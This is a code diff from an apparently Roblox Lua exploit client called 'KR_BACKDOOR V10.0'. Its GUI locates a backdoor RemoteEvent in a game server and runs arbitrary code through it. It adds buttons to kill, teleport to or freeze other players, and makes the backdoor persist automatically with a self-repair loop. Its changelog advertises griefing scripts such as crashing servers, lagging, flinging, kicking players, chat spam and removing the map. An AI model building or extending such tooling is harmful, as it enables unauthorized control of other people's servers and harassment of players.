+		pDot.BackgroundColor3 = isLocal and Color3.fromRGB(0, 200, 255) or Color3.fromRGB(0, 200, 0)
+		pDot.BorderSizePixel = 0
+		round(pDot, 4)
+
+		local pName = Instance.new("TextLabel", row)
+		pName.Size = UDim2.new(1, -140, 1, 0)
+		pName.Position = UDim2.new(0, 24, 0, 0)
+		pName.BackgroundTransparency = 1
+		pName.Text = player.Name .. (isLocal and " (YOU)" or "")
+		pName.TextColor3 = isLocal and Color3.fromRGB(0, 200, 255) or Color3.fromRGB(200, 200, 200)
+		pName.Font = Enum.Font.GothamBold
+		pName.TextSize = 10
+		pName.TextXAlignment = Enum.TextXAlignment.Left
+		pName.TextTruncate = Enum.TextTruncate.AtEnd
+
+		if not isLocal then
+			local killBtn = Instance.new("TextButton", row)
+			killBtn.Size = UDim2.new(0, 40, 0, 22)
+			killBtn.Position = UDim2.new(1, -95, 0.5, -11)
+			killBtn.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
+			killBtn.Text = "KILL"
+			killBtn.TextColor3 = Color3.new(1, 1, 1)
+			killBtn.Font = Enum.Font.GothamBold
+			killBtn.TextSize = 8
+			round(killBtn, 5)
+
+			killBtn.MouseButton1Click:Connect(function()
+				execute("game.Players['"..player.Name.."'].Character:BreakJoints()")
+				addLog("Kill: " .. player.Name, "info")
+			end)
+
+			local tpBtn = Instance.new("TextButton", row)
+			tpBtn.Size = UDim2.new(0, 30, 0, 22)
+			tpBtn.Position = UDim2.new(1, -50, 0.5, -11)
+			tpBtn.BackgroundColor3 = Color3.fromRGB(0, 60, 100)
+			tpBtn.Text = "TP"
+			tpBtn.TextColor3 = Color3.new(1, 1, 1)
+			tpBtn.Font = Enum.Font.GothamBold
+			tpBtn.TextSize = 8
+			round(tpBtn, 5)
+
+			tpBtn.MouseButton1Click:Connect(function()
+				pcall(function()
+					Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
+				end)
+				addLog("Teleported to: " .. player.Name, "success")
+				notify("TP to " .. player.Name, "success")
+			end)
+
+			local frzBtn = Instance.new("TextButton", row)
+			frzBtn.Size = UDim2.new(0, 30, 0, 22)
+			frzBtn.Position = UDim2.new(1, -15, 0.5, -11)
+			frzBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 0)
+			frzBtn.Text = "FZ"
+			frzBtn.TextColor3 = Color3.new(1, 1, 1)
+			frzBtn.Font = Enum.Font.GothamBold
+			frzBtn.TextSize = 8
+			round(frzBtn, 5)
+
+			frzBtn.MouseButton1Click:Connect(function()
+				execute("game.Players['"..player.Name.."'].Character.HumanoidRootPart.Anchored = true")
+				addLog("Freeze: " .. player.Name, "info")
+			end)
+		end
+	end
+	playersScroll.CanvasSize = UDim2.new(0, 0, 0, count * 40 + 10)
+	playersTitle.Text = "Online Players (" .. count .. ")"
+end
+
+local refreshPlayersBtn = Instance.new("TextButton", pages.Players)
+refreshPlayersBtn.Size = UDim2.new(0, 70, 0, 22)
+refreshPlayersBtn.Position = UDim2.new(1, -75, 0, 2)
+refreshPlayersBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+refreshPlayersBtn.Text = "REFRESH"
+refreshPlayersBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
+refreshPlayersBtn.Font = Enum.Font.GothamBold
+refreshPlayersBtn.TextSize = 8
+round(refreshPlayersBtn, 6)
+addButtonEffects(refreshPlayersBtn, Color3.fromRGB(40, 40, 40), Color3.fromRGB(80, 80, 80))
+
+refreshPlayersBtn.MouseButton1Click:Connect(refreshPlayers)
+
+local scannerTitle = Instance.new("Frame", pages.Scanner)
+scannerTitle.Size = UDim2.new(1, 0, 0, 28)
+scannerTitle.BackgroundTransparency = 1
+scannerTitle.LayoutOrder = -1
+
+local scanLabel = Instance.new("TextLabel", scannerTitle)
+scanLabel.Size = UDim2.new(0.6, 0, 1, 0)
+scanLabel.BackgroundTransparency = 1
+scanLabel.Text = "RemoteEvents: 0"
+scanLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
+scanLabel.Font = Enum.Font.GothamBold
+scanLabel.TextSize = 12
+scanLabel.TextXAlignment = Enum.TextXAlignment.Left
+local scanPad = Instance.new("UIPadding", scanLabel)
+scanPad.PaddingLeft = UDim.new(0, 10)
+
+local rescanBtn = Instance.new("TextButton", scannerTitle)
+rescanBtn.Size = UDim2.new(0, 80, 0, 22)
+rescanBtn.Position = UDim2.new(1, -90, 0, 3)
+rescanBtn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
+rescanBtn.Text = "RESCAN"
+rescanBtn.TextColor3 = Color3.fromRGB(220, 220, 220)
+rescanBtn.Font = Enum.Font.GothamBold
+rescanBtn.TextSize = 9
+round(rescanBtn, 6)
+addButtonEffects(rescanBtn, Color3.fromRGB(60, 0, 0), Color3.fromRGB(120, 0, 0))
+
+local scanLayout = Instance.new("UIListLayout", pages.Scanner)
+scanLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+scanLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
 local function scanRemotes()
-    for _, v in pairs(game:GetDescendants()) do
-        if v:IsA("RemoteEvent") then
-            local l = Instance.new("TextLabel", pages.Scanner); l.Size = UDim2.new(0.95, 0, 0, 25); l.BackgroundColor3 = Color3.new(0,0,0); l.Text = v:GetFullName(); l.TextColor3 = Color3.new(0.8, 0.8, 0.8); l.TextSize = 9; l.Font = "Code"; round(l, 4)
-        end
-    end
+	for _, child in pairs(pages.Scanner:GetChildren()) do
+		if child:IsA("TextLabel") and child ~= scanLabel then child:Destroy() end
+	end
+	local count = 0
+	for _, v in pairs(game:GetDescendants()) do
+		if v:IsA("RemoteEvent") then
+			local l = Instance.new("TextLabel", pages.Scanner)
+			l.Size = UDim2.new(0.95, 0, 0, 25)
+			l.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
+			l.Text = "  " .. v:GetFullName()
+			l.TextColor3 = Color3.fromRGB(170, 170, 170)
+			l.TextSize = 9
+			l.Font = Enum.Font.Code
+			l.TextXAlignment = Enum.TextXAlignment.Left
+			round(l, 4)
+			Instance.new("UIStroke", l).Color = Color3.fromRGB(40, 0, 0)
+			count = count + 1
+		end
+	end
+	pages.Scanner.CanvasSize = UDim2.new(0, 0, 0, count * 31 + 40)
+	scanLabel.Text = "RemoteEvents: " .. count
+	addLog("Scanned " .. count .. " RemoteEvents", "system")
 end
-Instance.new("UIListLayout", pages.Scanner).HorizontalAlignment = "Center"
 
--- [[ TOGGLE (K) ]] --
-local visible = true
-UserInputService.InputBegan:Connect(function(input) if input.KeyCode == Enum.KeyCode.K then visible = not visible; mainFrame.Visible = visible end end)
+rescanBtn.MouseButton1Click:Connect(function()
+	scanRemotes()
+	notify("Rescanned remotes", "info")
+end)
 
--- [[ СТАРТ ]] --
-runBtn.MouseButton1Click:Connect(function() execute(editor.Text) end)
-clearBtn.MouseButton1Click:Connect(function() editor.Text = "" end)
+local updateLog = {
+	{ver = "V10.0 RELEASE", entries = {
+		{type = "add", text = "Redesigned buttons - dark minimal style"},
+		{type = "fix", text = "Persist button color no longer resets on hover"},
+		{type = "fix", text = "Status bar corners now rounded properly"},
+		{type = "add", text = "STOP ALL button - kills loops, unfreezes, resets"},
+		{type = "add", text = "Scrollable code editor for long scripts"},
+		{type = "add", text = "RESCAN button in Scanner tab"},
+		{type = "add", text = "Uptime counter in status bar"},
+		{type = "fix", text = "Tab layout fixed, no overlap with X and _"},
+	}},
+	{ver = "V9.7 BETA", entries = {
+		{type = "add", text = "CHAOS category: Loop Kill, Crash, Lag, Fling, Explode, Remove Map"},
+		{type = "add", text = "PROTECT category: Anti-Kick, Anti-TP, God Mode"},
+		{type = "add", text = "Chat Spam, Hint Spam, MSG Popup scripts"},
+		{type = "add", text = "Invisible All, Giant All, Seizure Sky, Kick Others"},
+		{type = "add", text = "Reset Lighting utility script"},
+		{type = "add", text = "18 new scripts (29 total)"},
+	}},
+	{ver = "V9.6 BETA", entries = {
+		{type = "add", text = "PERSIST BACKDOOR - auto server backup"},
+		{type = "add", text = "Auto-reconnect if backdoor destroyed"},
+		{type = "add", text = "kr_backup fallback with self-repair loop"},
+		{type = "add", text = "Auto-persist on first connect"},
+		{type = "fix", text = "Execute auto-reconnects if lost"},
+	}},
+	{ver = "V9.5 BETA", entries = {
+		{type = "add", text = "Close (X) and Minimize (_) buttons"},
+		{type = "add", text = "Players tab with KILL/TP/FREEZE"},
+		{type = "add", text = "Script categories (TROLL/SERVER/VISUAL)"},
+		{type = "add", text = "Copy to editor button on scripts"},
+		{type = "add", text = "Character/line counter in editor"},
+		{type = "add", text = "CLIPBOARD button in executor"},
+		{type = "add", text = "FPS counter in status bar"},
+		{type = "add", text = "Loading bar animation"},
+		{type = "add", text = "Category color-coded accents"},
+	}},
+	{ver = "V9.4 BETA", entries = {
+		{type = "add", text = "Console tab with timestamped logs"},
+		{type = "add", text = "Search bar in Scripts tab"},
+		{type = "add", text = "Notifications on execute (slide-in)"},
+		{type = "add", text = "Execute logs success/error status"},
+		{type = "fix", text = "Library scripts now log to console"},
+	}},
+	{ver = "V9.3 BETA", entries = {
+		{type = "add", text = "Shadow effect behind main window"},
+		{type = "add", text = "Active tab indicator with underline"},
+		{type = "add", text = "Status bar with connection info"},
+		{type = "add", text = "Editor redesign with accent bar"},
+		{type = "fix", text = "Improved script buttons with left accent"},
+		{type = "add", text = "Window open/close animation"},
+	}},
+	{ver = "V9.2 BETA", entries = {
+		{type = "add", text = "Added Updates tab with changelog"},
+		{type = "fix", text = "Fixed Scanner CanvasSize not updating"},
+		{type = "add", text = "Mobile toggle button (bottom-left)"},
+	}},
+	{ver = "V9.1 BETA", entries = {
+		{type = "fix", text = "Fixed CoreGui fallback for some executors"},
+		{type = "add", text = "Added Rainbow Disco / Black Hole scripts"},
+		{type = "fix", text = "Fixed drag on mobile (Touch support)"},
+	}},
+	{ver = "V9.0 BETA", entries = {
+		{type = "add", text = "New Infernal UI design with animated gradient"},
+		{type = "add", text = "Scanner tab for RemoteEvents"},
+		{type = "add", text = "Script library with 11 scripts"},
+		{type = "bug", text = "Scanner CanvasSize not updating"},
+		{type = "bug", text = "No mobile toggle button"},
+	}},
+}
+
+local typeColors = {
+	add = {bg = Color3.fromRGB(0, 100, 0), tag = "[+] NEW"},
+	fix = {bg = Color3.fromRGB(140, 120, 0), tag = "[~] FIX"},
+	bug = {bg = Color3.fromRGB(150, 0, 0), tag = "[!] BUG"},
+}
+
+local uLayout = Instance.new("UIListLayout", pages.Updates)
+uLayout.Padding = UDim.new(0, 6)
+uLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+local totalHeight = 0
+
+for _, update in ipairs(updateLog) do
+	local isRelease = string.find(update.ver, "RELEASE")
+	local verHeader = Instance.new("TextLabel", pages.Updates)
+	verHeader.Size = UDim2.new(0.92, 0, 0, 35)
+	verHeader.BackgroundColor3 = isRelease and Color3.fromRGB(10, 30, 10) or Color3.fromRGB(20, 20, 20)
+	verHeader.Text = "  " .. update.ver
+	verHeader.TextColor3 = isRelease and Color3.fromRGB(0, 220, 0) or Color3.fromRGB(180, 80, 80)
+	verHeader.Font = Enum.Font.GothamBold
+	verHeader.TextSize = 16
+	verHeader.TextXAlignment = Enum.TextXAlignment.Left
+	round(verHeader, 8)
+	Instance.new("UIStroke", verHeader).Color = Color3.fromRGB(80, 0, 0)
+	totalHeight = totalHeight + 41
+
+	for _, entry in ipairs(update.entries) do
+		local info = typeColors[entry.type]
+		local row = Instance.new("Frame", pages.Updates)
+		row.Size = UDim2.new(0.92, 0, 0, 30)
+		row.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
+		round(row, 6)
+
+		local tag = Instance.new("TextLabel", row)
+		tag.Size = UDim2.new(0, 70, 0, 22)
+		tag.Position = UDim2.new(0, 6, 0.5, -11)
+		tag.BackgroundColor3 = info.bg
+		tag.BackgroundTransparency = 0.2
+		tag.Text = info.tag
+		tag.TextColor3 = Color3.new(1, 1, 1)
+		tag.Font = Enum.Font.GothamBold
+		tag.TextSize = 9
+		round(tag, 5)
+
+		local desc = Instance.new("TextLabel", row)
+		desc.Size = UDim2.new(1, -85, 1, 0)
+		desc.Position = UDim2.new(0, 82, 0, 0)
+		desc.BackgroundTransparency = 1
+		desc.Text = entry.text
+		desc.TextColor3 = Color3.fromRGB(190, 190, 190)
+		desc.Font = Enum.Font.Gotham
+		desc.TextSize = 11
+		desc.TextXAlignment = Enum.TextXAlignment.Left
+
+		totalHeight = totalHeight + 36
+	end
+end
+
+pages.Updates.CanvasSize = UDim2.new(0, 0, 0, totalHeight + 20)
+
+local toggleBtn = Instance.new("TextButton", sg)
+toggleBtn.Size = UDim2.new(0, 50, 0, 50)
+toggleBtn.Position = UDim2.new(0, 15, 1, -70)
+toggleBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+toggleBtn.Text = "KR"
+toggleBtn.TextColor3 = Color3.new(1, 1, 1)
+toggleBtn.Font = Enum.Font.GothamBold
+toggleBtn.TextSize = 14
+round(toggleBtn, 25)
+
+local toggleStroke = Instance.new("UIStroke", toggleBtn)
+toggleStroke.Color = Color3.fromRGB(255, 50, 50)
+toggleStroke.Thickness = 2
+toggleStroke.Transparency = 0.4
 
 task.spawn(function()
-    wait(1.5)
-    backdoor = ReplicatedStorage:FindFirstChild(targetName)
-    if not backdoor then
-        for _, v in pairs(ReplicatedStorage:GetChildren()) do if v:IsA("RemoteEvent") then backdoor = v; break end end
-    end
-    statusLabel.Text = backdoor and "System Synced" or "Offline Mode"
-    wait(1)
-    statusLabel.Text = "Created by Krsp Team"
-    scanRemotes()
-    wait(1.5); loader:Destroy(); mainFrame.Visible = true
+	while toggleBtn and toggleBtn.Parent do
+		TweenService:Create(toggleStroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine), {Transparency = 0.8}):Play()
+		task.wait(1.5)
+		TweenService:Create(toggleStroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine), {Transparency = 0.2}):Play()
+		task.wait(1.5)
+	end
+end)
+
+addButtonEffects(toggleBtn, Color3.fromRGB(150, 0, 0), Color3.fromRGB(200, 30, 30))
+
+Instance.new("UIScale", mainFrame)
+
+toggleBtn.MouseButton1Click:Connect(function()
+	visible = not visible
+	if visible then showMain() else hideMain() end
+end)
+
+UserInputService.InputBegan:Connect(function(input)
+	if input.KeyCode == Enum.KeyCode.K then
+		visible = not visible
+		if visible then showMain() else hideMain() end
+	end
+end)
+
+runBtn.MouseButton1Click:Connect(function()
+	if editor.Text == "" then
+		notify("Editor is empty", "warn")
+		addLog("Attempted execute with empty editor", "warn")
+		return
+	end
+	execute(editor.Text)
+end)
+
+clearBtn.MouseButton1Click:Connect(function()
+	editor.Text = ""
+	charCounter.Text = "0 chars | 0 lines"
+	addLog("Editor cleared", "system")
+end)
+
+pasteBtn.MouseButton1Click:Connect(function()
+	notify("Tap editor and paste from clipboard", "info")
+	addLog("Clipboard hint shown", "system")
+end)
+
+stopBtn.MouseButton1Click:Connect(function()
+	if backdoor then
+		local stopCode = [[
+for _,v in pairs(workspace:GetChildren()) do
+	if v:IsA("Hint") or v:IsA("Message") then v:Destroy() end
+end
+for _,v in pairs(game.Players:GetPlayers()) do
+	pcall(function()
+		v.Character.HumanoidRootPart.Anchored = false
+		v.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
+	end)
+end
+game.Lighting.TimeOfDay = "14:00:00"
+game.Lighting.Brightness = 2
+game.Lighting.Ambient = Color3.new(0.5,0.5,0.5)
+game.Lighting.FogEnd = 100000
+]]
+		execute(stopCode)
+		addLog("STOP ALL: cleaned hints, unfroze, reset lighting", "system")
+		notify("All effects stopped", "success")
+	else
+		notify("No backdoor to stop scripts", "error")
+	end
+end)
+
+persistBtn.MouseButton1Click:Connect(function()
+	persistBackdoor()
+end)
+
+task.spawn(function()
+	addLog("KR_BACKDOOR V10.0 loading...", "system")
+
+	TweenService:Create(loadBarFill, TweenInfo.new(1), {Size = UDim2.new(0.4, 0, 1, 0)}):Play()
+	wait(1)
+	statusLabel.Text = "Scanning remotes..."
+	TweenService:Create(loadBarFill, TweenInfo.new(0.8), {Size = UDim2.new(0.7, 0, 1, 0)}):Play()
+
+	backdoor = findBackdoor()
+
+	wait(0.8)
+	TweenService:Create(loadBarFill, TweenInfo.new(0.5), {Size = UDim2.new(1, 0, 1, 0)}):Play()
+
+	updateStatus()
+	if backdoor then
+		addLog("Backdoor found: " .. backdoor:GetFullName(), "success")
+		watchBackdoor()
+		task.delay(2, function()
+			persistBackdoor()
+		end)
+	else
+		addLog("No backdoor found - Offline Mode", "warn")
+	end
+
+	statusLabel.Text = backdoor and "System Synced" or "Offline Mode"
+	wait(0.5)
+	statusLabel.Text = "Created by Krsp Team"
+	scanRemotes()
+	refreshPlayers()
+	wait(1)
+	loader:Destroy()
+	visible = true
+	showMain()
+	notify("KR_BACKDOOR V10.0 loaded", "info")
+	addLog("Interface ready", "success")
 end)
